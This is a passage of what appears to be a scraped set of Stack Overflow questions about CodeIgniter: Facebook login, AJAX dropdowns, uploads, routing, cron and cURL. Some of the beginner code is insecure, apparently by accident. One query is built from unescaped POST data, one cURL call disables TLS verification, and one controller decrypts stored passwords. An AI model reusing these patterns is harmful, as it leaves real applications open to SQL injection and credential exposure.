$this-&gt;doj_database-&gt;search_with_id($id);\n        $data['user']['password'] = $this-&gt;encrypt-&gt;decode($data['user']['password']);\n        $this-&gt;load-&gt;view('home', $data);\n    }\n    else\n    {\n        $this-&gt;load-&gt;view('not_logged_in');\n    }\n}\n\n\n\npublic function logout()\n{\n    $this-&gt;session-&gt;sess_destroy();\n    $this-&gt;load-&gt;view('index');\n}\n</code></pre>\n"},{"tags":["codeigniter","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13261295,"title":"How to call my model or controller of codeigniter outside application directory?","body":"<p>I have the following doubts:</p>\n\n<p>I have my project in codeigniter which uses Flash. Its structure is as follows:</p>\n\n<pre><code>name_proyect\n      application /\n             controller /\n             model /\n             view /\n      audiofiles/\n            //Here are being saved all audios.\n      user_guide /\n      flash /\n            archivos.swf\n            save_audio.php\n      system /\n      index.php\n</code></pre>\n\n<p>The flash uses <strong>save_audio.php</strong> file, which is saving an audio on my server.\nHowever, when I save the physical file on my server also need to save the file path in my database associated with the user.</p>\n\n<p>My question is, I can use the active record in the file of codeigniter <strong>save_audio.php</strong>? o I can use my model or controller that use the model in my project that saving to database?</p>\n\n<p><em><strong>NOTE:</em></strong> <code>save_audio.php</code> is a simple script (isn't a class)</p>\n"},{"tags":["php","facebook","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13282815,"title":"Facebook's getUser() returns nothing","body":"<p>I am working on facebook login for my site(CI Version 2.1.3). I have downloaded the facebook and placed at <code>libraries/facebook/</code> </p>\n\n<p><strong>Library:</strong></p>\n\n<pre><code>include(APPPATH.'libraries/facebook/facebook.php');\n\nclass Fb_lib extends Facebook{\n\n    public  $user_id    =   NULL;\n    public  $user       =   NULL;\n    public  $fb         =   FALSE;\n    public  $fbSession  =   FALSE;\n    public  $appkey     =   0;\n\n\n    public function Fb_lib(){\n\n        $CI =&amp; get_instance();\n        $CI-&gt;config-&gt;load('facebook', TRUE);\n        parent::__construct($CI-&gt;config-&gt;item('facebook')); \n\n        $this-&gt;user_id  =   $this-&gt;getUser();\n        $me             =   NULL;\n        //Getting response\n        if($this-&gt;user_id){\n            try {\n                //parent :: $CURL_OPTS[CURLOPT_SSL_VERIFYPEER] = false; \n                //parent :: $CURL_OPTS[CURLOPT_SSL_VERIFYHOST] = 2;\n\n                $me =   $this-&gt;api('/me');\n                $this-&gt;user =   $me;\n\n            } catch(FacebookApiException $e) {\n                echo \"&lt;pre&gt;\"; print_r($e); echo \"&lt;/pre&gt;\";\n            }\n        }\n    }\n}\n</code></pre>\n\n<p><strong>Controller:</strong> </p>\n\n<pre><code>class Fbconnect extends CI_Controller {\n\n    public function __construct(){\n\n        parent::__construct();\n\n        $this-&gt;load-&gt;library('Fb_lib');\n    }\n\n    public function request(){\n\n        $data   =   array(\n                'redirect_uri'  =&gt;  base_url().'fbconnect/response',\n                'scope'         =&gt;  array('email', 'user_birthday')\n            );\n\n        redirect($this-&gt;fb_lib-&gt;getLoginURL($data));\n    }\n\n    public function response(){\n\n        if($this-&gt;fb_lib-&gt;user){\n            echo \"&lt;pre&gt;\"; print_r($this-&gt;fb_lib-&gt;user); echo \"&lt;/pre&gt;jj\";\n        } else {\n            echo \"Failed to get data\";\n        }\n    }\n\n}\n</code></pre>\n\n<p><strong>Problem:</strong></p>\n\n<p>It's working fine upto seeking permissions from the user but not returning results. In <strong>Fb_lib</strong> <code>$this-&gt;getUser()</code> returns nothing so in <code>response()</code> Its printing <strong>\"Failed to get data\"</strong></p>\n\n<p>What i am doing wrong here ?</p>\n"},{"tags":["jquery","ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13245299,"title":"Dynamic Dropdowns with AJAX, Jquery, and Codeigniter Help: Firebug not showing errors","body":"<p>I am having trouble getting ajax to work with my \"dynamic combo box.\"  First here is the code:\nThe View:</p>\n\n<pre><code>&lt;?php echo form_open('control_form/add_all'); ?&gt;\n    &lt;label for=\"make\"&gt;State&lt;span class=\"red\"&gt;*&lt;/span&gt;&lt;/label&gt;\n    &lt;select id=\"make\" name=\"make\" &gt;\n        &lt;option value=\"\"&gt;&lt;/option&gt;\n        &lt;?php\n        foreach($makeOptions-&gt;result() as $make){\n            echo '&lt;option value=\"' . $make-&gt;make_id . '\"&gt;' . $make-&gt;make . '&lt;/option&gt;';\n        }\n        ?&gt;\n    &lt;/select&gt;\n    &lt;label for=\"model\"&gt;City&lt;span class=\"red\"&gt;*&lt;/span&gt;&lt;/label&gt;\n    &lt;!--this will be filled based on the tree selection above--&gt;\n    &lt;select id=\"model\" name=\"model\"&gt; \n        &lt;option value=\"\"&gt;&lt;/option&gt;\n    &lt;/select&gt;\n    &lt;label for=\"f_membername\"&gt;Member Name&lt;span class=\"red\"&gt;*&lt;/span&gt;&lt;/label&gt;\n    &lt;!--&lt;input type=\"text\" name=\"f_membername\"/&gt;--&gt;\n    &lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<p>The View Controller:</p>\n\n<pre><code>    function dropDown(){\n         if ($this-&gt;ion_auth-&gt;requireAdmin())         \n        $data = array('title' =&gt; 'DropDown', 'main_content' =&gt;     'admin/dropDown');        \n        $data['makeOptions'] = $this-&gt;vehicle_model-&gt;getMake(Null, Null);\n        $data['modelOptions'] = $this-&gt;vehicle_model-&gt;getModel(Null, Null, NULL, Null);            \n        $this-&gt;load-&gt;view('admin/includes/template', $data);          \n}\n</code></pre>\n\n<p>The Ajax controller:</p>\n\n<pre><code>   function get_model($make){    \n    header('Content-Type: application/x-json; charset=utf-8');\n    echo(json_encode($this-&gt;vehicle_model-&gt;getModelByMake ($make)));\n} \n</code></pre>\n\n<p>The Jquery:</p>\n\n<pre><code>$('#model').hide();\n $('#make').change(function(){\nvar make_id = $('#make').val();\nif (make_id != \"\"){\n    var post_url = \"http://pulsedrivers.com/admin/get_model/\" + make_id;\n    $.ajax({\n        type: \"POST\",\n         url: post_url,\n         success: function(models) //we're calling the response json array 'cities'\n          {\n            $('#model').empty();\n            $('#model').show();\n               $.each(models,function(model_id,model) \n               {\n                var opt = $('&lt;option /&gt;'); // here we're creating a new select option for each group\n                  opt.val(model_id);\n                  opt.text(model);\n                  $('#model').append(opt); \n            });\n           } //end success\n     }); //end AJAX\n} else {\n    $('#model').empty();\n    $('#model').hide();\n}//end if\n}); //end change \n</code></pre>\n\n<p>The Model (used by get_model controller):</p>\n\n<pre><code>function getModelByMake ($make, $tree = null){\n    $this-&gt;db-&gt;select('model_id, model, make_id');\n\n    if($tree != NULL){\n        $this-&gt;db-&gt;where('make_id', $make);\n    }\n        $this-&gt;db-&gt;where('make_id', $make);\n    $query = $this-&gt;db-&gt;get('model');\n    $models = array();\n\n    if($query-&gt;result()){\n        foreach ($query-&gt;result() as $model) {\n            $models[$model-&gt;model_id] = $model-&gt;model;\n        }\n        return $models;\n    } else {\n        return FALSE;\n    }\n}\n</code></pre>\n\n<p>The view contains two dropdowns, one displays makes, the other the corresponding models.  The models are not showing up after a make is selected.  Firebug does not show any errors during the process.</p>\n\n<p>Things already checked: jquery works, the script loads.</p>\n\n<p>The controller get_models returns an array like this 1:Corvette, 2:Camaro so that seems its works correctly as well.</p>\n\n<p>Any help is gratefully appreciated, thanks!</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":35,"score":-1,"question_id":13282237,"title":"url restriction in codeigniter","body":"<p>I am using Codeigniter. I am creating a shopping cart website. I have a product detail page where the url is 'localhost://shopcart/product/productid'. I copy this url and then logout from the site. Then I paste that url in the url it goes to that page. How could I restrict that?</p>\n"},{"tags":["mysql","codeigniter","codeigniter-2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13281604,"title":"using localhost MySql from online Codeigniter","body":"<p>I have a Codeigniter project on a machine and it runs as public access. However the MySql database it uses is accessible only through localhost. When I run the application, I get</p>\n\n<pre><code>A Database Error Occurred\n\nUnable to connect to your database server using the provided settings.\n\nFilename: core/Loader.php\n\nLine Number: 346\n</code></pre>\n\n<p>I follwed the instructions mentioned <a href=\"http://codeigniter.com/forums/viewthread/207916/\" rel=\"nofollow\">here</a> but I am still getting the same error</p>\n\n<pre><code>Try\n\n1. print_r($params) and print_r($active_record);\n\n2. if the $params are still correct then simplify $active_record\n\n3. echo mysql_error();\n\n4. $db[‘default’][‘db_debug’] = true/false\n\n5. $db[‘default’][‘stricton’] = true/false; \n</code></pre>\n\n<p>[edited]</p>\n\n<p>I have set the parameters as </p>\n\n<pre><code>$db['default']['hostname'] = 'mysql12.freehostia.com';\n$db['default']['username'] = 'username';\n$db['default']['password'] = 'password';\n$db['default']['database'] = 'myDB';\n$db['default']['dbdriver'] = 'mysql';\n$db['default']['dbprefix'] = '';\n$db['default']['pconnect'] = false;\n$db['default']['db_debug'] = true;\n$db['default']['cache_on'] = FALSE;\n$db['default']['cachedir'] = '';\n$db['default']['char_set'] = 'utf8';\n$db['default']['dbcollat'] = 'utf8_general_ci';\n$db['default']['swap_pre'] = '';\n$db['default']['autoinit'] = TRUE;\n$db['default']['stricton'] = false;\n</code></pre>\n"},{"tags":["php","codeigniter","codeigniter-2","database-abstraction"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13281535,"title":"CodeIgnitor, Stored Procedures & Returning Custom Messages","body":"<p>So, I'm currently trying to get familiar with CodeIgnitor and I'm having trouble trying to wrap my head around how MVC works. Below is code I came up with to call a stored procedure and return a custom message from the stored procedure. For example, 'Student ID Already Exist' is a custom message. So far in CodeIgnitor I was able to create the model, view and controller to insert values into the database via the stored procedure but this was without returning any of the custom messages I created in the stored procedure. So, my questions are how would I convert what I have below into CI and what would I need to add to my current Model and Controller (and View) to return custom messages from the stored procedure.</p>\n\n<hr>\n\n<p>Original PHP Script</p>\n\n<pre><code>$studentID = $_POST['student_id'];\n$fname = $_POST['first_name'];\n$lname = $_POST['last_name'];\n$street = $_POST['street']; \n$city = $_POST['city']; \n$state = $_POST['state'];\n$zipcode = $_POST['zip_code']; \n$email = $_POST['email'];\n$tel = $_POST['telephone']; \n$grad_year = $_POST['graduation_year']; \n$department =$_POST['school_department']; \n$degree = $_POST['degree']; \n\n$stmt = $mysqli-&gt;prepare('CALL sp_add_alumni(?,?,?,?,?,?,?,?,?,?,?)'); \n\n$stmt-&gt;bind_param('issssssssss', $studentID, $fname, $lname, $street, $city,$state, $zipcode, $email, $tel, $degree, $department );\n\n$stmt-&gt;execute();\n$res = $stmt-&gt;get_result();\n$row = $res-&gt;fetch_array(MYSQL_NUM);\nprintf(\"%s\",$row[0]);\n</code></pre>\n\n<hr>\n\n<pre><code>CI Model\nfunction add_alumni($student_id, $first_name,$last_name,$address, $city, $state, $zip_code, $email, $telephone, $degree, $deparment)\n    {\n        $query=$this-&gt;db-&gt;query(\"CALL sp_add_alumni($student_id, '$first_name','$last_name','$address', '$city', '$state', '$zip_code', '$email', '$telephone', '$degree', '$deparment')\");\n        return $query-&gt;result_array();\n    }\n</code></pre>\n\n<hr>\n\n<pre><code>CI Controller \nfunction add_alumni()\n    {\n        if($_POST)\n        {\n            $student_id =$_POST['student_id']; \n            $first_name=$_POST['first_name'];\n            $last_name=$_POST['last_name'];\n            $address=$_POST['street'];\n            $city=$_POST['city'];\n            $state=$_POST['state']; \n            $zip_code=$_POST['zip_code'];\n            $email=$_POST['email'];\n            $telephone=$_POST['telephone'];\n            $degree=$_POST['degree'];\n            $deparment=$_POST['school_department'];\n\n            $this-&gt;admins-&gt;add_alumni($student_id, $first_name,$last_name,$address, $city, $state, $zip_code, $email, $telephone, $degree, $deparment);\n\n        } else {\n            $this-&gt;load-&gt;view('inc/header.inc.php');\n            $this-&gt;load-&gt;view('add_alumni');\n            $this-&gt;load-&gt;view('inc/footer.inc.php');\n        }\n    }\n</code></pre>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13281439,"title":"Codeigniter routes and mod rewrite","body":"<p>for some reasons i've been having problems with mod rewrite, i have the index.php removed from the url ok but when i try to do the same for profiles it shows some contact webmaster page.\nNow i'm taking the routes option but i have a little problem.</p>\n\n<pre><code>My url is http://website.com/user/profile/user_profile/username \n</code></pre>\n\n<p>I have this in my routes </p>\n\n<pre><code>$route['profile/(:any)'] = 'user/profile/user_profile';\n</code></pre>\n\n<p>So when i type in website.com/profile/username, it works fine. My question is, what if i want to get rid of the /profile as well and have website.com/username, how do it go about it with routes?</p>\n\n<p>Just incase, i might as well put my trail with modrewrite on here so all you brilliant minds can tell me where i'm going wrong.</p>\n\n<pre><code>Options FollowSymLinks\nRewriteEngine on\n\nRewriteCond $1 !^(index\\.php|images|css|javascript|cron|sit-env|robots\\.txt)\n\nRewriteCond $1 !^(index\\.php|javascript|sit-env|robots\\.txt)\n\nRewriteRule ^(.*)$ /index.php/$1 [L]\n\nRewriteCond $1 !^(index\\.php|images|css|javascript|cron|sit-env|robots\\.txt)\n\nRewriteCond $1 !^(index\\.php|javascript|sit-env|robots\\.txt)\n\nRewriteRule ^([0-9a-zA-Z]+)([\\/]?)$ /user/profile.php/user_profile/$1 [L]\n</code></pre>\n\n<p>Thanks in advance :)</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13280525,"title":"Codeigniter and Tank_auth sending validation to view not working","body":"<p>Hi I am new to Codeigniter but have hit a brick wall. </p>\n\n<p>I am trying to see if a user already exists. </p>\n\n<p>First I upload the data via a form to a controller which does its validation etc but breaks on only that issue. I managed to find where it breaks but cant fix it from there. </p>\n\n<p><em>Prior to all this it querys the database finds there is in fact a match username and then reaches the snippet below</em></p>\n\n<pre><code>      $errors = $this-&gt;tank_auth-&gt;get_error_message(); \n      //find the correct error msg\n\n      foreach ($errors as $k =&gt; $v) $data['errors'][$k] =$this-&gt;lang-&gt;line($v);        \n      //loop and find etc\n\n      $temp_mess = $data['errors'][$k]; \n      //stores relevant stuff in the string\n    }\n  }\n//echo $temp_mess; it outputs to the html so i can see it \"says user exists\"\n$data['temp_mess'] = $tempmess; /// put this into a array\n\n$this-&gt;load-&gt;view('layout', $data); ///send \n    }\n}\n</code></pre>\n\n<p>Now for the view, it then calls the layout view etc but alas there is no output </p>\n\n<pre><code>$username1 = array(\n        'name'  =&gt; 'username1',\n        'id'    =&gt; 'username1',\n        'value' =&gt; set_value('username1'),\n        'maxlength' =&gt; $this-&gt;config-&gt;item('username_max_length', 'tank_auth'),\n        'size'  =&gt; 30,\n    );\n\n&lt;?php echo form_open('register', $form_reg_id ); ?&gt;\n\n&lt;fieldset&gt;\n&lt;legend align=\"center\"&gt;Sign up&lt;/legend&gt;\n    &lt;?php echo form_label('Username', $username1['id']); ?&gt;\n    &lt;?php echo form_input($username1); ?&gt;\n    &lt;?php $tempmess; ?&gt;\n    &lt;div class=\"error\"&gt;&lt;?php echo form_error($username1['name']); ?&gt;\n    &lt;?php echo isset($errors[$username1['name']])?$errors[$username1['name']]:''; ?&gt;\n&lt;?php echo form_close(); ?&gt;\n&lt;/fieldset&gt;\n</code></pre>\n\n<p>Thanks for any help on this </p>\n\n<p>also could some one explain this line please. (for a really dumb person)</p>\n\n<pre><code>&lt;?php echo isset($errors[$username1['name']])?$errors[$username1['name']]:''; ?&gt;\n</code></pre>\n"},{"tags":["codeigniter","cron","cpanel"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13281407,"title":"Codeigniter Cronjob cPanel Command Line (Using Bootstrapper)","body":"<p>I've just set up a Cronjob using the bootstrapper on GitHub (mentioned on here but not this specific issue).\n<a href=\"https://github.com/EllisLab/CodeIgniter/wiki/Cron-job-bootstrapper\" rel=\"nofollow\">https://github.com/EllisLab/CodeIgniter/wiki/Cron-job-bootstrapper</a></p>\n\n<p>As per guidance I have defined the CI index.php as below</p>\n\n<pre><code>define('CRON_CI_INDEX', '/home/mysite/public_html/index.php');\n</code></pre>\n\n<p>As a new user to the syntax, I'm not sure I'm entering the correct information on the command line. I have:</p>\n\n<pre><code>php -q -f /home/mysite/public_html/cronjobbootstrapper/cron.php --run=/testing/email_sending_function\n</code></pre>\n\n<p>And various other variations without the -- before run= etc. I'm not sure what I'm doing wrong here, it's not particularly clear in the guidance but others on here have used it successfully! I simply get an email through from the server containing part of the file contents.\nUsage: cron.php --run=/testing/mail_send_greg [--show-output][-S] [--log-file=logfile] [--time-limit=N] [--server=http_server_name]</p>\n"},{"tags":["php","jquery","ajax","codeigniter","file-upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13281159,"title":"Why, when uploading files via Ajax, is CodeIgniter throwing a \"no file uploaded\" error?","body":"<p>All I'm trying to do is upload files using ajax to my CodeIgniter based website.  But for some reason CodeIgniter keeps giving the \"no file uploaded\" error. How can I resolve this?</p>\n\n<p>Here is the JavaScript:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\nfunction updatebgimage()\n    {   \n        regexp = /^[^[\\]]+/;\n        var imgfile = document.getElementById(\"imagetoresize\"); \n        var fileInputName = regexp.exec( imgfile['name'] ); \n        formdata = new FormData(); \n        formdata.append(\"imagetoresize\",imgfile.files[0]);\n        $.ajax({  \n            url: \"&lt;?php echo site_url('uploadbgimage'); ?&gt;\",  \n            type: \"POST\",  \n            data: formdata,  \n            dataType: \"json\",\n            processData: false,  \n            contentType: false,  \n            success: function (data) {  \n                    alert(data.message); \n            }  \n        });  \n    } \n&lt;/script&gt;\n</code></pre>\n\n<p>Here is the CodeIgniter controller being called:</p>\n\n<pre><code>public function uploadbgimage()\n{\n    $config['upload_path'] = './images/stores/'.$memberid.'/'; \n    $config['file_name'] = 'main_bg_image.jpg'; \n    $config['allowed_types'] = 'jpg|png'; \n    $config['overwrite'] = true;       \n    $this-&gt;load-&gt;library('upload', $config);  \n    $data = array();\n    if (! $this-&gt;upload-&gt;do_upload(\"bgimage\"))\n    {\n        $data['result'] = 'fail';\n    $data['message'] = $this-&gt;upload-&gt;display_errors();  \n    } \n    else \n    {\n         $data['result'] = 'success';\n     $data['message'] = 'file was uploaded fine';  \n    }\n    echo json_encode($data);\n}\n</code></pre>\n\n<p>Here is the HTML:</p>\n\n<pre><code>&lt;form method=\"post\" enctype=\"multipart/form-data\"&gt;\n     &lt;input type=\"file\" id=\"imagetoresize\" name=\"imagetoresize\" value=\"\" class=\"field1\" /&gt; \n     &lt;input type=\"button\" onclick=\"updatebgimage()\" value=\"UploadBGImage\" /&gt; \n&lt;/form&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13280111,"title":"Send Data from Database Into View","body":"<p>I'm trying to find the \"users\" current subscription on the database and display it's name in a view. Primary is the ID, so I'm using the User ID from session to find the appropriate row in the \"subscriptions\". This works as it should (I believe anyways). My problem is sending the selected data to the view. The only text that shows up in the view is \"array\".</p>\n\n<p>What am I doing wrong?</p>\n\n<p>Here's my code:</p>\n\n<pre><code>    // displays current subscription in view\n    $userid = $this -&gt; session -&gt; userdata('user_id');\n\n    $this -&gt; db -&gt; select('subscription');\n    $this -&gt; db -&gt; where ('id', $userid);\n    $query = $this -&gt; db -&gt; get('subscriptions');\n\n    $data['packagename'] = $query -&gt; result_array();\n</code></pre>\n\n<p>Here's what I'm echoing in my view:</p>\n\n<pre><code>    &lt;? echo $packagename; ?&gt;\n</code></pre>\n\n<p><strong>EDIT:</strong> I looked into the FOREACH function in the CI manual. I plugged this in and feel a bit closer. I don't want anything overly complex, code wise like some of you have posted, as I'm just learning. So now when the page is rendered, the following text is displayed: <code>string(9) \"mrpopular\"</code> </p>\n\n<pre><code>    // displays current subscription in view\n    $userid = $this -&gt; session -&gt; userdata('user_id');\n\n    $this -&gt; db -&gt; select('subscription');\n    $this -&gt; db -&gt; where ('id', $userid);\n    $query = $this -&gt; db -&gt; get('subscriptions');\n\n    foreach ($query-&gt;result() as $row)\n    {\n        $data['packagename'] = $row-&gt;subscription;\n    }   \n</code></pre>\n"},{"tags":["php","codeigniter","curl","slow-load"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":182,"score":4,"question_id":12907234,"title":"Why CodeIgniter's Curl library slower than using Curl in plain PHP?","body":"<p>Recently I moved my scraping code with Curl to CodeIgniter. I'm using Curl CI library from <a href=\"http://philsturgeon.co.uk/code/codeigniter-curl\" rel=\"nofollow\">http://philsturgeon.co.uk/code/codeigniter-curl</a>. I put the scraping process in a controller and then I found the execution time of my scraping is slower than the one I built in plain PHP.</p>\n\n<p>It took 12 seconds for CodeIgniter to output the result, whereas it only takes 6 seconds in plain PHP. Both are including the parsing process with the HTML DOM parser.</p>\n\n<p>Here's my Curl code in CodeIgniter:</p>\n\n<pre><code>function curl($url, $postdata=false)\n{\n  $agent = \"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)\";\n\n  $this-&gt;curl-&gt;create($url);\n  $this-&gt;curl-&gt;ssl(false);\n  $options = array(\n    'URL'             =&gt; $url,\n    'HEADER'          =&gt; 0,\n    'AUTOREFERER'     =&gt; true,\n    'FOLLOWLOCATION'  =&gt; true,\n    'TIMEOUT'         =&gt; 60,\n    'RETURNTRANSFER'  =&gt; 1,\n    'USERAGENT'       =&gt; $agent,\n    'COOKIEJAR'       =&gt; dirname(__FILE__) . \"/cookie.txt\",\n    'COOKIEFILE'      =&gt; dirname(__FILE__) . \"/cookie.txt\",\n  );\n\n  if($postdata)\n  {\n    $this-&gt;curl-&gt;post($postdata, $options);\n  }\n  else\n  {\n    $this-&gt;curl-&gt;options($options);\n  }\n\n  return $this-&gt;curl-&gt;execute();\n}\n</code></pre>\n\n<p>non codeigniter (plain php) code :</p>\n\n<p>function curl($url ,$binary=false,$post=false,$cookie =false ){</p>\n\n<pre><code>    $ch = curl_init();\n\n    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Accepts all CAs\n    curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 2); \n\n    curl_setopt ($ch, CURLOPT_URL, $url );\n    curl_setopt ($ch, CURLOPT_HEADER, 0);\n    curl_setopt($ch, CURLOPT_REFERER, $url);\n    curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');\n    curl_setopt($ch, CURLOPT_AUTOREFERER, true);\n    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n    curl_setopt($ch, CURLOPT_TIMEOUT, 60);\n    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);\n\n\n\n    if($cookie){\n\n\n        $agent = \"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)\";\n        curl_setopt($ch, CURLOPT_USERAGENT, $agent);\n        curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . \"/cookie.txt\");\n        curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) . \"/cookie.txt\");\n\n    }\n\n\n    if($binary)\n        curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);\n\n\n    if($post){\n\n\n        foreach($post as $key=&gt;$value) \n            { \n        $post_array_string1 .= $key.'='.$value.'&amp;'; \n        }\n        $post_array_string1 = rtrim($post_array_string1,'&amp;');\n\n        //set the url, number of POST vars, POST data\n\n        curl_setopt($ch, CURLOPT_POST, true);\n        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_array_string1);\n    }\n\n        return  curl_exec ($ch);\n</code></pre>\n\n<p>}</p>\n\n<p>Does anyone know why this CodeIgniter Curl is slower??  or maybe it's because the simple_html_dom parser??</p>\n"},{"tags":["facebook","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13279421,"title":"Impossible to get the signed_request in Facebook Page Tab, through CodeIgniter","body":"<p>I'm trying to display a page I generate through CodeIgniter in a Facebook Page Tab. My tab is displaying the page in the iframe perfectly, but when I try to retrieve the <code>signed_request</code> to test if the user likes my page, I get nothing at all.</p>\n\n<p>I tried like in <a href=\"http://www.masteringapi.com/tutorials/determine-if-the-user-likes-fan-of-your-page-when-landing-on-your-page-tab/29/\" rel=\"nofollow\">this tutorial</a> at first, and it works as long as I'm not generating my page through CodeIgniter. And then I found I'm not the only one with this problem, and all the solutions I have found so far doesn't work to me. I've checked <a href=\"http://stackoverflow.com/questions/10424316/facebook-php-sdk-with-codeigniter-not-returning-requestsigned-request\">this</a>, <a href=\"http://stackoverflow.com/questions/9189783/not-receiving-signed-request-in-facebook-iframe-app\">this</a> and <a href=\"http://stackoverflow.com/questions/7534241/why-do-i-get-an-undefined-index-for-signed-request-in-my-facebook-app\">this</a>. None of these solutions has worked (even the one that makes you avoid the use of <code>$_REQUEST</code>, that CodeIgniter appears to be clearing).</p>\n\n<p>How can I get the <code>signed_request</code> then?</p>\n"},{"tags":["facebook","codeigniter","access-token"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":18,"score":-1,"question_id":13261521,"title":"access_token facebook sign up says \"Trying to get property of non-object\"","body":"<p>I am having some \"Trying to get property of non-object\" issue with facebook sign up. The server returns errors related to access_token.</p>\n\n<p>i have error form line 490 and 451. on line 451 i succeed to solve it but i ve still 2 errors from line 490.</p>\n\n<p>the line was fixed by changing if ( $token->access_token ) by if ( $token['access_token'] )\nI think the problem is due to codeigniter. </p>\n\n<p>the line 490 is the following one:</p>\n\n<pre><code>   private function _token_string()\n    {\n        return 'access_token='.$this-&gt;_get('token')-&gt;access_token;\n    }\n</code></pre>\n\n<p>Here is the entire code:\n\n\n<pre><code>class Facebook_Lib extends CI_Config\n{\n\n    private $_api_url;\n    private $_api_key;\n    private $_api_secret;\n    private $_errors = array();\n    private $_enable_debug = FALSE;\n\n    function __construct()\n    {\n        $this-&gt;_obj =$CI =&amp; get_instance();\n\n        $this-&gt;_obj-&gt;load-&gt;library('session');\n        $this-&gt;_obj-&gt;load-&gt;helper('url');\n        $this-&gt;_obj-&gt;load-&gt;helper('facebook');\n\n        $fb_api_id     = $CI-&gt;db-&gt;get_where('settings', array('code' =&gt; 'SITE_FB_API_ID'))-&gt;row()-&gt;string_value;\n        $fb_api_secret = $CI-&gt;db-&gt;get_where('settings', array('code' =&gt; 'SITE_FB_API_SECRET'))-&gt;row()-&gt;string_value;\n\n        $this-&gt;_api_url        = $this-&gt;_obj-&gt;config-&gt;item('facebook_api_url');\n        $this-&gt;_api_key     = $fb_api_id;\n        $this-&gt;_api_secret  = $fb_api_secret;\n\n        $this-&gt;session = new facebookSession();\n        $this-&gt;connection = new facebookConnection();\n    }\n\n    public function logged_in()\n    {\n        return $this-&gt;session-&gt;logged_in();\n    }\n\n    public function login($scope = NULL)\n    {\n        return $this-&gt;session-&gt;login($scope);\n    }\n\n    public function login_url($scope = NULL)\n    {\n        return $this-&gt;session-&gt;login_url($scope);\n    }\n\n    public function logout()\n    {\n        return $this-&gt;session-&gt;logout();\n    }\n\n    public function user()\n    {\n        return $this-&gt;session-&gt;get();\n    }\n\n    public function call($method, $uri, $data = array())\n    {\n        $response = FALSE;\n\n        try\n        {\n            switch ( $method )\n            {\n                case 'get':\n                    $response = $this-&gt;connection-&gt;get($this-&gt;append_token($this-&gt;_api_url.$uri));\n                break;\n\n                case 'post':\n                    $response = $this-&gt;connection-&gt;post($this-&gt;append_token($this-&gt;_api_url.$uri), $data);\n                break;\n            }\n        }\n        catch (facebookException $e)\n        {\n            $this-&gt;_errors[] = $e;\n\n            if ( $this-&gt;_enable_debug )\n            {\n                echo $e;\n            }\n        }\n\n        return $response;\n    }\n\n    public function errors()\n    {\n        return $this-&gt;_errors;\n    }\n\n    public function last_error()\n    {\n        if ( count($this-&gt;_errors) == 0 ) return NULL;\n\n        return $this-&gt;_errors[count($this-&gt;_errors) - 1];\n    }\n\n    public function append_token($url)\n    {\n        return $this-&gt;session-&gt;append_token($url);\n    }\n\n    public function set_callback($url)\n    {\n        return $this-&gt;session-&gt;set_callback($url);\n    }\n\n    public function enable_debug($debug = TRUE)\n    {\n        $this-&gt;_enable_debug = (bool) $debug;\n\n\n    }\n}\n\nclass facebookConnection {\n\n    // Allow multi-threading.\n\n    private $_mch = NULL;\n    private $_properties = array();\n\n    function __construct()\n    {\n        $this-&gt;_mch = curl_multi_init();\n\n        $this-&gt;_properties = array(\n            'code'      =&gt; CURLINFO_HTTP_CODE,\n            'time'      =&gt; CURLINFO_TOTAL_TIME,\n            'length'    =&gt; CURLINFO_CONTENT_LENGTH_DOWNLOAD,\n            'type'      =&gt; CURLINFO_CONTENT_TYPE\n        );\n    }\n\n    private function _initConnection($url)\n    {\n        $this-&gt;_ch = curl_init($url);\n        curl_setopt($this-&gt;_ch, CURLOPT_RETURNTRANSFER, TRUE);\n    }\n\n    public function get($url, $params = array())\n    {\n        if ( count($params) &gt; 0 )\n        {\n            $url .= '?';\n\n            foreach( $params as $k =&gt; $v )\n            {\n                $url .= \"{$k}={$v}&amp;\";\n            }\n\n            $url = substr($url, 0, -1);\n        }\n\n        $this-&gt;_initConnection($url);\n        $response = $this-&gt;_addCurl($url, $params);\n\n        return $response;\n    }\n\n    public function post($url, $params = array())\n    {\n        // Todo\n        $post = '';\n\n        foreach ( $params as $k =&gt; $v )\n        